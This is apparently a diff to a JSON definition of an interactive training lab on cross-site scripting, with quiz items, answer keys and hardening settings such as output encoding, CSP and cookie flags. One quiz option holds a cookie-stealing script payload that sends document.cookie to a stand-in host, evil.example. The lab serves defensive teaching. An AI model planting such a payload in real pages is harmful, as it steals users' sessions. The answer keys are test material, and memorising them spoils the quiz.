@@ -7,6 +7,7 @@
   "level": "Intermediate",
   "minutes": 10,
   "blurb": "Understand reflected and stored XSS, find it in logs, and stop it with output encoding and a content security policy.",
+  "purpose": "Cross-site scripting turns a trusted web site into a way to run an attacker's script in users' browsers. In this lab you learn how to recognize it and which defenses in the application and the network reduce it.",
   "scenario": "Users of the company's support portal report pop-ups and being logged out unexpectedly. A comment on a support ticket seems to be involved. Investigate cross-site scripting (XSS) and harden the portal.",
   "topology": "Attacker ── support portal ── victim's browser",
   "objectives": [
@@ -23,9 +24,36 @@
       "screen": "XSS types",
       "button": "Check",
       "fields": [
-        { "label": "Script saved in a ticket comment runs for everyone who opens the ticket", "kind": "select", "options": ["Stored", "Reflected", "DOM-based"], "answer": "Stored" },
-        { "label": "Script in a link's search parameter is echoed back in the results page", "kind": "select", "options": ["Stored", "Reflected", "DOM-based"], "answer": "Reflected" },
-        { "label": "The page's own JavaScript writes the URL fragment into the page", "kind": "select", "options": ["Stored", "Reflected", "DOM-based"], "answer": "DOM-based" }
+        {
+          "label": "Script saved in a ticket comment runs for everyone who opens the ticket",
+          "kind": "select",
+          "options": [
+            "Stored",
+            "Reflected",
+            "DOM-based"
+          ],
+          "answer": "Stored"
+        },
+        {
+          "label": "Script in a link's search parameter is echoed back in the results page",
+          "kind": "select",
+          "options": [
+            "Stored",
+            "Reflected",
+            "DOM-based"
+          ],
+          "answer": "Reflected"
+        },
+        {
+          "label": "The page's own JavaScript writes the URL fragment into the page",
+          "kind": "select",
+          "options": [
+            "Stored",
+            "Reflected",
+            "DOM-based"
+          ],
+          "answer": "DOM-based"
+        }
       ]
     },
     {
@@ -34,9 +62,18 @@
       "task": "Answer the question.",
       "question": "Which saved ticket comment shows an XSS attempt?",
       "options": [
-        { "text": "Thanks! <script>new Image().src='//evil.example/c?'+document.cookie</script>", "correct": true },
-        { "text": "The printer on floor 3 shows error 0x8007.", "why": "That's an ordinary comment." },
-        { "text": "Please reset my password, ticket #4471.", "why": "That's an ordinary comment." }
+        {
+          "text": "Thanks! <script>new Image().src='//evil.example/c?'+document.cookie</script>",
+          "correct": true
+        },
+        {
+          "text": "The printer on floor 3 shows error 0x8007.",
+          "why": "That's an ordinary comment."
+        },
+        {
+          "text": "Please reset my password, ticket #4471.",
+          "why": "That's an ordinary comment."
+        }
       ]
     },
     {
@@ -47,9 +84,35 @@
       "screen": "Support portal › Security settings",
       "button": "Save",
       "fields": [
-        { "label": "Ticket comments are shown with", "kind": "select", "options": ["HTML output encoding", "Raw HTML", "A blocklist of the word script"], "answer": "HTML output encoding" },
-        { "label": "Content-Security-Policy", "kind": "select", "options": ["script-src 'self'", "script-src *", "No header"], "answer": "script-src 'self'" },
-        { "label": "Session cookie flags", "kind": "select", "options": ["HttpOnly; Secure; SameSite=Lax", "No flags"], "answer": "HttpOnly; Secure; SameSite=Lax" }
+        {
+          "label": "Ticket comments are shown with",
+          "kind": "select",
+          "options": [
+            "HTML output encoding",
+            "Raw HTML",
+            "A blocklist of the word script"
+          ],
+          "answer": "HTML output encoding"
+        },
+        {
+          "label": "Content-Security-Policy",
+          "kind": "select",
+          "options": [
+            "script-src 'self'",
+            "script-src *",
+            "No header"
+          ],
+          "answer": "script-src 'self'"
+        },
+        {
+          "label": "Session cookie flags",
+          "kind": "select",
+          "options": [
+            "HttpOnly; Secure; SameSite=Lax",
+            "No flags"
+          ],
+          "answer": "HttpOnly; Secure; SameSite=Lax"
+        }
       ]
     },
     {
@@ -58,8 +121,14 @@
       "task": "Answer the question.",
       "question": "Why isn't removing the word \"script\" from comments enough?",
       "options": [
-        { "text": "Script can run without a script tag, for example through event attributes such as onerror, and filters are easy to dodge with different case or encodings. Encoding the output handles every case.", "correct": true },
-        { "text": "It is enough, because XSS always needs a script tag.", "why": "Event handlers, javascript: URLs and other contexts can all run code." }
+        {
+          "text": "Script can run without a script tag, for example through event attributes such as onerror, and filters are easy to dodge with different case or encodings. Encoding the output handles every case.",
+          "correct": true
+        },
+        {
+          "text": "It is enough, because XSS always needs a script tag.",
+          "why": "Event handlers, javascript: URLs and other contexts can all run code."
+        }
       ]
     }
   ],
